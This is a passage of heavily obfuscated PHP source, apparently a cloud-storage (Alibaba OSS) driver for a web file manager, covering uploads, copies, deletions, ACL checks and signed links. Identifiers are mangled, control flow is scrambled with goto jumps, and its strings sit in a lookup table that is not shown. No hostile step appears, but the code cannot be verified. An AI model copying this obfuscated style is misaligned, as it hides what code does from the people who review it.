array(OSS\OssClient::OSS_HEADERS => array($AÊÁ£–Ñå±[1191] => $fŞËÅ·®Ó)); } $B’é¢ö½µÚ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Cœ¨êÀ‰âå), $b”±æô¨‹í); goto FÊÛ‹§Õˆ½; föŞ¼¼ÀÑ: $aãã•³“Ñ = 1024 * 1024 * 10; $Dìœ¿Àé = $this->client->generateMultiuploadParts($EŸ‹¦Îä¢ƒ, $aãã•³“Ñ); foreach ($Dìœ¿Àé as $dùŠ·ÌÜÙá => $DèÓˆØŠŸ) { $Céàš©ï¾ = $AĞç»ëÙŒ› + (int) $DèÓˆØŠŸ[$AÊÁ£–Ñå±[1192]]; $cÖÊ‚ô¾÷§ = (int) $DèÓˆØŠŸ[$AÊÁ£–Ñå±[329]] + $Céàš©ï¾ - 1; $aˆÛ¤Ä£Œ = array($AÊÁ£–Ñå±[1193] => $Céàš©ï¾, $AÊÁ£–Ñå±[1194] => $cÖÊ‚ô¾÷§); $fÈë¬ºÏ•Ø[] = $this->client->uploadPartCopy($this->bucket, $E¡–îÖÉÛ­, $this->bucket, $this->pathEncode($Cœ¨êÀ‰âå), $D°Õ«¤‡õÌ, $B’é¢ö½µÚ, $aˆÛ¤Ä£Œ); $D°Õ«¤‡õÌ = $D°Õ«¤‡õÌ + 1; } goto Dà‹°×ÖÙ; C£òÊŸ‰Å: } catch (OSS\Core\OssException $bôçˆ°º) { return !1; } return !0; } public function moveFile($CÀ‘¯Ó×é£, $dâ•ÈÈÙ–) { if ($this->copyFile($CÀ‘¯Ó×é£, $dâ•ÈÈÙ–)) { $this->remove($CÀ‘¯Ó×é£); return $this->getPathOuter($dâ•ÈÈÙ–); } return !1; } public function delFile($BŞá…îì¨›) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($BŞá…îì¨›)); } catch (OSS\Core\OssException $EÛŸœÉÚŸ) { return !1; } return !0; } public function delFolder($eª›©¬‹Œ©) { $cŒøÄÃ“’„ =& $_SERVER[‡’¶øåüç˜]; $B—…ÑŒåã˜ = $this->fileList($eª›©¬‹Œ©); if (!empty($eª›©¬‹Œ©) && !in_array(trim($eª›©¬‹Œ©, $cŒøÄÃ“’„[8]) . $cŒøÄÃ“’„[8], $B—…ÑŒåã˜[$cŒøÄÃ“’„[73]])) { $B—…ÑŒåã˜[$cŒøÄÃ“’„[73]][] = trim($eª›©¬‹Œ©, $cŒøÄÃ“’„[8]) . $cŒøÄÃ“’„[8]; } foreach (array_chunk($B—…ÑŒåã˜[$cŒøÄÃ“’„[73]], 1000) as $BÙ‚¿•£ò´) { try { $this->client->deleteObjects($this->bucket, $BÙ‚¿•£ò´); } catch (OSS\Core\OssException $C˜ƒˆù˜Şå) { continue; } } return !0; } public function rename($AßªŒÍ¿øõ, $c¯ÕÊ‚Á‹±) { return $this->renameObject($AßªŒÍ¿øõ, $c¯ÕÊ‚Á‹±); } private function fileInfo($CÑïÊ©Ü¢î, $aÎÉ÷ÂÇ³¤ = array()) { goto c¦×Öò¥´„; c¦×Öò¥´„: $AÁÚÕ¢ø„Ç =& $_SERVER[‡’¶øåüç˜]; $e†Ó¸ğ»­Á = array($AÁÚÕ¢ø„Ç[28] => $this->pathThis($CÑïÊ©Ü¢î), $AÁÚÕ¢ø„Ç[75] => $this->getPathOuter($CÑïÊ©Ü¢î), $AÁÚÕ¢ø„Ç[29] => $AÁÚÕ¢ø„Ç[171], $AÁÚÕ¢ø„Ç[191] => 0, $AÁÚÕ¢ø„Ç[107] => 0, $AÁÚÕ¢ø„Ç[77] => 0, $AÁÚÕ¢ø„Ç[165] => $this->ext($CÑïÊ©Ü¢î), $AÁÚÕ¢ø„Ç[192] => !0, $AÁÚÕ¢ø„Ç[193] => !0); if (empty($aÎÉ÷ÂÇ³¤)) { $aò¸ŞÂÔøğ = $this->objectMeta($CÑïÊ©Ü¢î); if (!$aò¸ŞÂÔøğ) { return $e†Ó¸ğ»­Á; } $aÎÉ÷ÂÇ³¤ = array($AÁÚÕ¢ø„Ç[107] => strtotime($aò¸ŞÂÔøğ[$AÁÚÕ¢ø„Ç[1197]]), $AÁÚÕ¢ø„Ç[77] => $aò¸ŞÂÔøğ[$AÁÚÕ¢ø„Ç[1198]] + 0); } goto D™Í¦™Šˆ; b½ÕˆÕîÒº: return $e†Ó¸ğ»­Á; goto a³±ÏÒæœ; D™Í¦™Šˆ: if (isset($aÎÉ÷ÂÇ³¤[$AÁÚÕ¢ø„Ç[77]])) { $e†Ó¸ğ»­Á[$AÁÚÕ¢ø„Ç[77]] = $aÎÉ÷ÂÇ³¤[$AÁÚÕ¢ø„Ç[77]]; } if (isset($aÎÉ÷ÂÇ³¤[$AÁÚÕ¢ø„Ç[107]])) { $e†Ó¸ğ»­Á[$AÁÚÕ¢ø„Ç[107]] = $aÎÉ÷ÂÇ³¤[$AÁÚÕ¢ø„Ç[107]]; } if (isset($aÎÉ÷ÂÇ³¤[$AÁÚÕ¢ø„Ç[194]]) && !trim($e†Ó¸ğ»­Á[$AÁÚÕ¢ø„Ç[107]])) { $e†Ó¸ğ»­Á[$AÁÚÕ¢ø„Ç[107]] = $aÎÉ÷ÂÇ³¤[$AÁÚÕ¢ø„Ç[194]]; } goto b½ÕˆÕîÒº; a³±ÏÒæœ: } private function folderInfo($A±‚ìÀêïÅ, $DƒŞ³µ— = array()) { $E›²âÀ…ºÆ =& $_SERVER[‡’¶øåüç˜]; $fä¹¼©çƒ = array($E›²âÀ…ºÆ[28] => $this->pathThis($A±‚ìÀêïÅ), $E›²âÀ…ºÆ[75] => $this->getPathOuter($E›²âÀ…ºÆ[8] . $A±‚ìÀêïÅ), $E›²âÀ…ºÆ[29] => $E›²âÀ…ºÆ[76], $E›²âÀ…ºÆ[191] => 0, $E›²âÀ…ºÆ[107] => 0, $E›²âÀ…ºÆ[192] => !0, $E›²âÀ…ºÆ[193] => !0); if (empty($DƒŞ³µ—)) { $A±‚ìÀêïÅ = rtrim($A±‚ìÀêïÅ, $E›²âÀ…ºÆ[8]) . $E›²âÀ…ºÆ[8]; $Cã¢¯…¦áÂ = $this->objectMeta($A±‚ìÀêïÅ); if (!$Cã¢¯…¦áÂ) { return $fä¹¼©çƒ; } $DƒŞ³µ— = array($E›²âÀ…ºÆ[191] => $Cã¢¯…¦áÂ[$E›²âÀ…ºÆ[1199]][$E›²âÀ…ºÆ[1200]], $E›²âÀ…ºÆ[107] => strtotime($Cã¢¯…¦áÂ[$E›²âÀ…ºÆ[1197]])); } if (isset($DƒŞ³µ—[$E›²âÀ…ºÆ[107]])) { $fä¹¼©çƒ[$E›²âÀ…ºÆ[107]] = $DƒŞ³µ—[$E›²âÀ…ºÆ[107]]; } if (isset($DƒŞ³µ—[$E›²âÀ…ºÆ[191]])) { $fä¹¼©çƒ[$E›²âÀ…ºÆ[191]] = $DƒŞ³µ—[$E›²âÀ…ºÆ[191]]; } return $fä¹¼©çƒ; } public function listPath($d¦¸Üç¦¦Ÿ, $d§â»–ìç = false) { $d‡Ñäà°« =& $_SERVER[‡’¶øåüç˜]; $fÊŸØóÄ‡’ = $this->fileList($d¦¸Üç¦¦Ÿ, $d‡Ñäà°«[8], !0); foreach ($fÊŸØóÄ‡’[$d‡Ñäà°«[74]] as $bÊøÀø™ÉÛ => $D¾—µÇäí) { $fÊŸØóÄ‡’[$d‡Ñäà°«[74]][$bÊøÀø™ÉÛ] = $this->folderInfo($D¾—µÇäí, $D¾—µÇäí); } foreach ($fÊŸØóÄ‡’[$d‡Ñäà°«[73]] as $bÊøÀø™ÉÛ => $D¾—µÇäí) { $fÊŸØóÄ‡’[$d‡Ñäà°«[73]][$bÊøÀø™ÉÛ] = $this->fileInfo($D¾—µÇäí[$d‡Ñäà°«[28]], $D¾—µÇäí); } return $fÊŸØóÄ‡’; } public function has($d†ÍƒÃÈù, $Aàîİ‹•‹Š = false, $DÁá÷æø–Ê = true) { goto e¨Ğã°äì; e¨Ğã°äì: $aùó¤Ô¡ìÖ =& $_SERVER[‡’¶øåüç˜]; $d†ÍƒÃÈù = trim($d†ÍƒÃÈù, $aùó¤Ô¡ìÖ[8]); $EÃ«‹¤Å«„ = empty($d†ÍƒÃÈù) ? $aùó¤Ô¡ìÖ[33] : $d†ÍƒÃÈù . $aùó¤Ô¡ìÖ[8]; goto EÄõÙ‹í­î; EÄõÙ‹í­î: $D·Ã£èùô = $aùó¤Ô¡ìÖ[33]; $f¸åˆÌØ¤À = 500; $f„ùÍÉŒ¹® = 0; goto cä¿Œ¦; cä¿Œ¦: $F®„¹œ¤¶± = 0; while (!0) { $E·¦¡…È„õ = array($aùó¤Ô¡ìÖ[1188] => $aùó¤Ô¡ìÖ[8], $aùó¤Ô¡ìÖ[190] => $EÃ«‹¤Å«„, $aùó¤Ô¡ìÖ[1189] => $f¸åˆÌØ¤À, $aùó¤Ô¡ìÖ[1190] => $D·Ã£èùô); try { $e¼¡¥Àô = $this->client->listObjects($this->bucket, $E·¦¡…È„õ); } catch (OSS\Core\OssException $aÄ–ÙÌÎ‰ˆ) { break; } $D·Ã£èùô = $e¼¡¥Àô->getNextMarker(); $c•Œ¬Ÿ†ù© = $e¼¡¥Àô->getObjectList(); $D¢¬×£Ì = $e¼¡¥Àô->getPrefixList(); if ($Aàîİ‹•‹Š) { if (count($c•Œ¬Ÿ†ù©) > 1 || count($c•Œ¬Ÿ†ù©) == 1 && $c•Œ¬Ÿ†ù©[0]->getKey() != $EÃ«‹¤Å«„) { $f„ùÍÉŒ¹® += count($c•Œ¬Ÿ†ù©) - 1; } if (!empty($D¢¬×£Ì)) { $F®„¹œ¤¶± += count($D¢¬×£Ì); } if ($D·Ã£èùô === $aùó¤Ô¡ìÖ[33]) { break; } continue; } if ($DÁá÷æø–Ê) { if (!empty($c•Œ¬Ÿ†ù©)) { if (count($c•Œ¬Ÿ†ù©) > 1 || $c•Œ¬Ÿ†ù©[0]->getKey() != $EÃ«‹¤Å«„) { return !0; } } } else { if (!empty($D¢¬×£Ì)) { return !0; } } if ($D·Ã£èùô === $aùó¤Ô¡ìÖ[33]) { break; } } if ($Aàîİ‹•‹Š) { return array($aùó¤Ô¡ìÖ[195] => $f„ùÍÉŒ¹®, $aùó¤Ô¡ìÖ[196] => $F®„¹œ¤¶±); } goto D²¼¦ëÆ; D²¼¦ëÆ: return !1; goto aÉìøùíÚ«; aÉìøùíÚ«: } public function listAll($dáæÀëíå) { $bÑœØÓ¤Ï¤ =& $_SERVER[‡’¶øåüç˜]; $dê­æĞæÈö = $this->fileList($dáæÀëíå, $bÑœØÓ¤Ï¤[33], !0); $Eêğ½°®—õ = array(); foreach ($dê­æĞæÈö[$bÑœØÓ¤Ï¤[73]] as $f…ê„Èá”«) { $Eêğ½°®—õ[$f…ê„Èá”«[$bÑœØÓ¤Ï¤[28]]] = $f…ê„Èá”«[$bÑœØÓ¤Ï¤[77]]; } return $this->listAllFiles($dáæÀëíå, array_keys($Eêğ½°®—õ), $Eêğ½°®—õ); } public function canRead($aÒÀµÛê…è) { $a™Û¡ŒÑÇ =& $_SERVER[‡’¶øåüç˜]; $a‰ëõÓš = $this->pathAcl($aÒÀµÛê…è); return $a‰ëõÓš == $a™Û¡ŒÑÇ[1201] || $a‰ëõÓš == $a™Û¡ŒÑÇ[504] ? !0 : !1; } public function canWrite($A“¢êœà†) { $Døê¸éæÃ® = $this->pathAcl($A“¢êœà†); return $Døê¸éæÃ® == $_SERVER[‡’¶øåüç˜][504] ? !0 : !1; } public function pathAcl($fÉöåìã•) { goto fùìµ“ Â; D¨Ñá™¢ÁÄ: return $cŒÛğ‚÷’Í; goto AÅÉò…İ•; bùÅµ¢…©³: $cŒÛğ‚÷’Í = $F½ì¥ÚùŒË == $e¾óè‰¨Šó[34] ? $this->bucketAcl : $F½ì¥ÚùŒË; if ($cŒÛğ‚÷’Í == $e¾óè‰¨Šó[1202]) { return $e¾óè‰¨Šó[1201]; } if ($cŒÛğ‚÷’Í == $e¾óè‰¨Šó[1203]) { return $e¾óè‰¨Šó[504]; } goto D¨Ñá™¢ÁÄ; fùìµ“ Â: $e¾óè‰¨Šó =& $_SERVER[‡’¶øåüç˜]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $F½ì¥ÚùŒË = $this->client->getObjectAcl($this->bucket, $this->pathEncode($fÉöåìã•)); } catch (OSS\Core\OssException $eÇ‘İ‹»Ş) { return !1; } goto bùÅµ¢…©³; AÅÉò…İ•: } private function chmodPath($b­¬±¨–¹¹, $e¥µÔŒ¶Ñ¸ = '') { $D—„ªø«Ï— =& $_SERVER[‡’¶øåüç˜]; $b¸µÉöİ©İ = empty($e¥µÔŒ¶Ñ¸) ? $D—„ªø«Ï—[1203] : $e¥µÔŒ¶Ñ¸; $a˜Ó®­ĞÑ = array($D—„ªø«Ï—[34], $D—„ªø«Ï—[189], $D—„ªø«Ï—[1202], $D—„ªø«Ï—[1203]); if (!in_array($b¸µÉöİ©İ, $a˜Ó®­ĞÑ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($b­¬±¨–¹¹), $b¸µÉöİ©İ); } catch (OSS\Core\OssException $fšİõ½í•Ş) { return !1; } return !0; } public function getContent($a¹×´´Á’Ü) { return $this->fileSubstr($a¹×´´Á’Ü, -1); } public function setContent($D’–ôÄõĞ, $càó†æœ¨ó = '') { $cŒ±Ò§‡¯¼ =& $_SERVER[‡’¶øåüç˜]; try { $d—ó‚æ‚‹ = $this->trafficLimit($cŒ±Ò§‡¯¼[1204]); $eæ›•Ãà™ = $this->client->putObject($this->bucket, $this->pathEncode($D’–ôÄõĞ), $càó†æœ¨ó, $d—ó‚æ‚‹); } catch (OSS\Core\OssException $CÔˆÜå¾ÕÌ) { return !1; } $d©ÉÎÉ¶’„ = array($cŒ±Ò§‡¯¼[1191] => trim($eæ›•Ãà™[$cŒ±Ò§‡¯¼[1205]], $cŒ±Ò§‡¯¼[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($D’–ôÄõĞ))); $this->updateObjMeta($D’–ôÄõĞ, $d©ÉÎÉ¶’„); return isset($eæ›•Ãà™[$cŒ±Ò§‡¯¼[1206]][$cŒ±Ò§‡¯¼[1153]]) ? (int) $eæ›•Ãà™[$cŒ±Ò§‡¯¼[1206]][$cŒ±Ò§‡¯¼[1153]] : strlen($eæ›•Ãà™); } private function updateObjMeta($BÖÉ‹àòÅÚ, $B‰Üàâå²Â) { $BÖÉ‹àòÅÚ = $this->pathEncode($BÖÉ‹àòÅÚ); try { $cŸ†—†ËÀŞ = array(OSS\OssClient::OSS_HEADERS => $B‰Üàâå²Â); $this->client->copyObject($this->bucket, $BÖÉ‹àòÅÚ, $this->bucket, $BÖÉ‹àòÅÚ, $cŸ†—†ËÀŞ); } catch (OSS\Core\OssException $Fá…îµÀÌİ) { return !1; } return !0; } public function upload($fÇ°¡Õ¿ƒŞ, $BË™ÑÅÏĞ¸, $Fë¥µ’’ïå = false, $A‘è¯¸‘‡é = REPEAT_REPLACE) { $bäÜÓ¾ÆáÊ =& $_SERVER[‡’¶øåüç˜]; $AÃÁ¤íŒó½ = trim($fÇ°¡Õ¿ƒŞ, $bäÜÓ¾ÆáÊ[8]); $CïÛô°È» = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($bäÜÓ¾ÆáÊ[1191] => @md5_file($BË™ÑÅÏĞ¸)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($fÇ°¡Õ¿ƒŞ))); $CïÛô°È» = $this->trafficLimit($bäÜÓ¾ÆáÊ[1204], $CïÛô°È»); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($AÃÁ¤íŒó½), $BË™ÑÅÏĞ¸, $CïÛô°È»); } catch (OSS\Core\OssException $A‡”íÜª¾ì) { return !1; } return $this->getPathOuter($fÇ°¡Õ¿ƒŞ); } public function getHost() { $Aª›ğµÔ¿ =& $_SERVER[‡’¶øåüç˜]; $ağÜºÍŠ¦÷ = explode($Aª›ğµÔ¿[175], parent::getHost()); return $ağÜºÍŠ¦÷[0] . $Aª›ğµÔ¿[175] . $this->bucket . $Aª›ğµÔ¿[91] . $ağÜºÍŠ¦÷[1]; } public function uploadFormData($c‰¥ª÷ÄÍ, $F½‹½Ğ’Êé = 3600) { goto Aã ƒĞÏÀˆ; E¨²²êä›Í: $b˜÷õñöš’ = $this->pathFather($c‰¥ª÷ÄÍ); $Aí†áÖ× = array($C´ßø­˜ğÚ[1109] => $f–ÏÑÅÄ¶, $C´ßø­˜ğÚ[1110] => array(array($C´ßø­˜ğÚ[1209], 0, $FÚÙÄ÷Şª), array($C´ßø­˜ğÚ[1113], $C´ßø­˜ğÚ[1114], $b˜÷õñöš’))); $bâ°ŞÚÈ“º = base64_encode(json_encode($Aí†áÖ×)); goto f®Œ°ùÓç§; aì–©Ìµë’: return $a†‡îõƒ; goto D»Ç×Á“; Aã ƒĞÏÀˆ: $C´ßø­˜ğÚ =& $_SERVER[‡’¶øåüç˜]; if (!($b‚ô˜ÅõŸ¯ = $this->getHost())) { return !1; } $a‘Öº†­ = $F½‹½Ğ’Êé; goto F‘Ë˜Ä¸Úã; aÀ‚íÜÜæ±: $C‡ß®²äÂ· = strpos($f–ÏÑÅÄ¶, $C´ßø­˜ğÚ[288]); $f–ÏÑÅÄ¶ = substr($f–ÏÑÅÄ¶, 0, $C‡ß®²äÂ·) . $C´ßø­˜ğÚ[1208]; $FÚÙÄ÷Şª = 1048576000 * 5; goto E¨²²êä›Í; F‘Ë˜Ä¸Úã: $díƒ†èÚå = date($C´ßø­˜ğÚ[1207], time() + $a‘Öº†­); $F¥±Úí¿„‹ = new DateTime($díƒ†èÚå); $f–ÏÑÅÄ¶ = $F¥±Úí¿„‹->format(DateTime::ISO8601); goto aÀ‚íÜÜæ±; f®Œ°ùÓç§: $EòÍİõ®á§ = base64_encode(hash_hmac($C´ßø­˜ğÚ[222], $bâ°ŞÚÈ“º, $this->secret, !0)); $a†‡îõƒ = array($C´ßø­˜ğÚ[1119] => $bâ°ŞÚÈ“º, $C´ßø­˜ğÚ[1210] => $this->accessKey, $C´ßø­˜ğÚ[1115] => $C´ßø­˜ğÚ[1107], $C´ßø­˜ğÚ[1211] => $EòÍİõ®á§, $C´ßø­˜ğÚ[173] => $b‚ô˜ÅõŸ¯); $a†‡îõƒ = $this->trafficLimit($C´ßø­˜ğÚ[1204], $a†‡îõƒ); goto aì–©Ìµë’; D»Ç×Á“: } public function multiUploadFormData($b‹¦Á¤˜¨¼, $D”Î¿ÍÌ¾ = 3600) { $f°ó«Å¡³Á =& $_SERVER[‡’¶øåüç˜]; if (!($EÍ«ç‡ò™• = $this->getHost())) { return !1; } $C…‘†î’ = $this->trafficLimit($f°ó«Å¡³Á[1204]); $fóù‹ŸÆ „ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($b‹¦Á¤˜¨¼), $C…‘†î’); return array($f°ó«Å¡³Á[213] => $fóù‹ŸÆ „, $f°ó«Å¡³Á[173] => $EÍ«ç‡ò™• . $f°ó«Å¡³Á[8] . $this->pathEncode($b‹¦Á¤˜¨¼), $f°ó«Å¡³Á[214] => gmdate($f°ó«Å¡³Á[1212]), $f°ó«Å¡³Á[89] => $b‹¦Á¤˜¨¼); } public function multiUploadAuthData($EÊöƒ¡ùî, $E‰Íˆ’¨Èä = array()) { goto Aß¾æ–Ë‰Í; Fƒ¿º¤Èå: $C¡òâ’‡£ = $EÊöƒ¡ùî; if (isset($E‰Íˆ’¨Èä[$A·ïî‡‰Ø­[89]])) { $C¡òâ’‡£ = $E‰Íˆ’¨Èä[$A·ïî‡‰Ø­[89]]; unset($E‰Íˆ’¨Èä[$A·ïî‡‰Ø­[89]]); } if (isset($E‰Íˆ’¨Èä[$A·ïî‡‰Ø­[215]])) { $E‰Íˆ’¨Èä[$A·ïî‡‰Ø­[214]] = $c¾Å±¼âÌ»; return $this->listUploadParts($C¡òâ’‡£, $E‰Íˆ’¨Èä); } goto fÊ‹àÎ‡Ò; a¸¼—×ã: $dšõ¨¡ÀÃç = $A·ïî‡‰Ø­[1178] . $this->accessKey . $A·ïî‡‰Ø­[4] . $D–¨‚¼ªà; if (strpos($BÂˆæ¼ÎìÜ, $A·ïî‡‰Ø­[217]) === 0) { $dšõ¨¡ÀÃç = array($A·ïî‡‰Ø­[224] => $dšõ¨¡ÀÃç, $A·ïî‡‰Ø­[214] => $c¾Å±¼âÌ»); if ($fˆîà…ãé‚) { $dšõ¨¡ÀÃç = array_merge($dšõ¨¡ÀÃç, $fˆîà…ãé‚); } } return $dšõ¨¡ÀÃç; goto AÍÌ²…õÃÎ; Aß¾æ–Ë‰Í: $A·ïî‡‰Ø­ =& $_SERVER[‡’¶øåüç˜]; $c¾Å±¼âÌ» = isset($E‰Íˆ’¨Èä[$A·ïî‡‰Ø­[214]]) ? $E‰Íˆ’¨Èä[$A·ïî‡‰Ø­[214]] : gmdate($A·ïî‡‰Ø­[1212]); $BÂˆæ¼ÎìÜ = isset($E‰Íˆ’¨Èä[$A·ïî‡‰Ø­[165]]) ? $E‰Íˆ’¨Èä[$A·ïî‡‰Ø­[165]] : $A·ïî‡‰Ø­[33]; goto Fƒ¿º¤Èå; fÊ‹àÎ‡Ò: $fŸÍËÈ³ö = array($A·ïî‡‰Ø­[216], $A·ïî‡‰Ø­[33], $A·ïî‡‰Ø­[116], $c¾Å±¼âÌ», "\x78\x2d\x6f\163\163\55\144\x61\164\x65\x3a{$c¾Å±¼âÌ»}", $A·ïî‡‰Ø­[8] . $this->bucket . $A·ïî‡‰Ø­[8] . $C¡òâ’‡£ . $BÂˆæ¼ÎìÜ); if (strpos($BÂˆæ¼ÎìÜ, $A·ïî‡‰Ø­[217]) === 0) { $fŸÍËÈ³ö[0] = $A·ïî‡‰Ø­[218]; if ($fˆîà…ãé‚ = $this->trafficLimit($A·ïî‡‰Ø­[1204])) { $C¡òâ’‡£ = $A·ïî‡‰Ø­[1213]; array_splice($fŸÍËÈ³ö, 5, 0, $C¡òâ’‡£ . $A·ïî‡‰Ø­[4] . $fˆîà…ãé‚[$C¡òâ’‡£]); } } if (isset($E‰Íˆ’¨Èä[$A·ïî‡‰Ø­[219]]) && $E‰Íˆ’¨Èä[$A·ïî‡‰Ø­[219]] == $A·ïî‡‰Ø­[220]) { $fŸÍËÈ³ö[0] = $A·ïî‡‰Ø­[220]; } goto eí¯º†—; eí¯º†—: if (!empty($E‰Íˆ’¨Èä[$A·ïî‡‰Ø­[1214]])) { $E’÷¢ºôÍ¦ = array_merge(array($fŸÍËÈ³ö[4]), $E‰Íˆ’¨Èä[$A·ïî‡‰Ø­[1214]]); sort($E’÷¢ºôÍ¦); $fŸÍËÈ³ö[4] = implode($A·ïî‡‰Ø­[221], $E’÷¢ºôÍ¦); } $dõÈ°Úëäî = implode($A·ïî‡‰Ø­[221], $fŸÍËÈ³ö); $D–¨‚¼ªà = base64_encode(hash_hmac($A·ïî‡‰Ø­[222], $dõÈ°Úëäî, $this->secret, !0)); goto a¸¼—×ã; AÍÌ²…õÃÎ: } public function listUploadParts($a½ÙÇë•’â, $EäŸÇ) { goto EÔÑ±çÖ; bÁ‘É˜ë“ø: $cöÈƒ‘º¢è = $A²İäÂÀ¸¢->getListPart(); $fËÂİ“éİœ = array(); foreach ($cöÈƒ‘º¢è as $aÇ¨ï³Óå) { $fËÂİ“éİœ[] = array($aï›ñà¶×Œ[1195] => $aÇ¨ï³Óå->getPartNumber(), $aï›ñà¶×Œ[1196] => trim($aÇ¨ï³Óå->getETag(), $aï›ñà¶×Œ[113])); } goto aîÒµ»ˆ¼Ó; aîÒµ»ˆ¼Ó: unset($EäŸÇ[$aï›ñà¶×Œ[215]], $EäŸÇ[$aï›ñà¶×Œ[219]]); $BËóÚÁáòê = $this->multiUploadAuthData($a½ÙÇë•’â, $EäŸÇ); if (empty($BËóÚÁáòê)) { return !1; } goto d…¹‹—ïÙ¸; d…¹‹—ïÙ¸: return array($aï›ñà¶×Œ[224] => $BËóÚÁáòê, $aï›ñà¶×Œ[214] => $EäŸÇ[$aï›ñà¶×Œ[214]], $aï›ñà¶×Œ[226] => $fËÂİ“éİœ); goto B—¬×†Â§»; EÔÑ±çÖ: $aï›ñà¶×Œ =& $_SERVER[‡’¶øåüç˜]; $D¨Á¿±³­ = parse_url_query($EäŸÇ[$aï›ñà¶×Œ[165]]); $A²İäÂÀ¸¢ = $this->client->listParts($this->bucket, $this->pathEncode($a½ÙÇë•’â), $D¨Á¿±³­[$aï›ñà¶×Œ[213]]); goto bÁ‘É˜ë“ø; B—¬×†Â§»: } public function download($D‹Çõø‰á›, $Bøìô§ÛÙ) { if ($this->isFolder($D‹Çõø‰á›)) { return !1; } try { $d®¿ ¡¥ëĞ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Bøìô§ÛÙ); $d®¿ ¡¥ëĞ = $this->trafficLimit($_SERVER[‡’¶øåüç˜][105], $d®¿ ¡¥ëĞ); $this->client->getObject($this->bucket, $this->pathEncode($D‹Çõø‰á›), $d®¿ ¡¥ëĞ); } catch (OSS\Core\OssException $f ‰‹ˆÕ…ö) { return !1; } return $Bøìô§ÛÙ; } public function fileSubstr($a¢›‘åíˆ, $F´óÕ—Ìİ÷ = 0, $bÆ“ËŞÛâ³ = false) { if ($F´óÕ—Ìİ÷ === -1) { $a¢ÜÛ÷¥İ = array(); } else { if ($bÆ“ËŞÛâ³ === !1) { $F¹Ó™­ò² = $this->size($a¢›‘åíˆ); } else { $F¹Ó™­ò² = $F´óÕ—Ìİ÷ + $bÆ“ËŞÛâ³ - 1; } $a¢ÜÛ÷¥İ = array(OSS\OssClient::OSS_RANGE => "{$F´óÕ—Ìİ÷}\x2d{$F¹Ó™­ò²}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($a¢›‘åíˆ), $a¢ÜÛ÷¥İ); } catch (OSS\Core\OssException $F„‹‘Õ¤‹í) { think_exception($F„‹‘Õ¤‹í->getMessage()); return !1; } } private function trafficLimit($Eø¹ğ‰Å½é, $Añ‘ÂÅİ„ = array()) { goto c½«Œìƒ£Î; bèÜí”Ù‰: return $Añ‘ÂÅİ„; goto fÍøõÔÍÓ; E„Æµ«Èí‡: if (!$cÜƒëÖ®Üƒ) { return $Añ‘ÂÅİ„; } $cÜƒëÖ®Üƒ = $cÜƒëÖ®Üƒ < 819200 ? 819200 : ($cÜƒëÖ®Üƒ > 838860800 ? 838860800 : $cÜƒëÖ®Üƒ); $Añ‘ÂÅİ„[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($cÜƒëÖ®Üƒ); goto bèÜí”Ù‰; c½«Œìƒ£Î: $f£Ñ–¿õÂÀ =& $_SERVER[‡’¶øåüç˜]; if ($Eø¹ğ‰Å½é == $f£Ñ–¿õÂÀ[1204] && $this->isUploadServer() || $Eø¹ğ‰Å½é == $f£Ñ–¿õÂÀ[105] && $this->isFileOutServer()) { return $Añ‘ÂÅİ„; } $cÜƒëÖ®Üƒ = floatval($GLOBALS[$f£Ñ–¿õÂÀ[6]][$f£Ñ–¿õÂÀ[84]][$f£Ñ–¿õÂÀ[103]][$Eø¹ğ‰Å½é]) * 1024 * 1024 * 8; goto E„Æµ«Èí‡; fÍøõÔÍÓ: } public function link($FŒÂ—Ø¯, $Eââ¢áƒÒÚ = array()) { $EÚ„êÀ¢”Ì =& $_SERVER[‡’¶øåüç˜]; if (!$this->exist($FŒÂ—Ø¯) || $this->isFolder($FŒÂ—Ø¯)) { return !1; } try { $Eââ¢áƒÒÚ = $this->trafficLimit($EÚ„êÀ¢”Ì[105], $Eââ¢áƒÒÚ); $fëÏ£ó¢§· = $this->client->signUrl($this->bucket, $this->pathEncode($FŒÂ—Ø¯), 3600 * 12, $EÚ„êÀ¢”Ì[220], $Eââ¢áƒÒÚ); return $this->getCdnLink($fëÏ£ó¢§·); } catch (OSS\Core\OssException $fÕè™Ò³ñ±) { return !1; } } public function fileOut($F±‹óÕÔè, $e°ÆÈ…ŠÈ = false, $b±…ğÊæó = false, $B ÑÎ¶£è« = '') { goto B£ì‹‡ˆ¨É; fß¢µíßô: $e°ÆÈ…ŠÈ = $e°ÆÈ…ŠÈ ? $A¡‹’¦¦šœ[206] : $A¡‹’¦¦šœ[207]; $bò§—ÃÌ”‘ = array(OSS\OssClient::OSS_SUB_RESOURCE => $A¡‹’¦¦šœ[1215] . rawurlencode("{$e°ÆÈ…ŠÈ}\73\x66\x69\154\x65\156\141\155\x65\x3d{$b±…ğÊæó}")); $bò§—ÃÌ”‘[OSS\OssClient::OSS_SUB_RESOURCE] .= $A¡‹’¦¦šœ[1216] . rawurlencode($Aò²öğˆª»); goto FŸàœï«; FŸàœï«: $D•øÃ½•Èè = $this->link($F±‹óÕÔè, $bò§—ÃÌ”‘); $this->fileOutLink($D•øÃ½•Èè); goto a™Ã´ïğÇ¾; C­ÌøƒÏ: $b±…ğÊæó = rawurlencode($b±…ğÊæó); $Aò²öğˆª» = get_file_mime(get_path_ext($b±…ğÊæó)); if ($Aò²öğˆª» == $A¡‹’¦¦šœ[205]) { return parent::fileOut($F±‹óÕÔè, $e°ÆÈ…ŠÈ, $b±…ğÊæó, $B ÑÎ¶£è«); } goto fß¢µíßô; B£ì‹‡ˆ¨É: $A¡‹’¦¦šœ =& $_SERVER[‡’¶øåüç˜]; if ($this->isFileOutServer()) { return $this->fileOutServer($F±‹óÕÔè, $e°ÆÈ…ŠÈ, $b±…ğÊæó, $B ÑÎ¶£è«); } if (!$b±…ğÊæó) { $b±…ğÊæó = $this->pathThis($F±‹óÕÔè); } goto 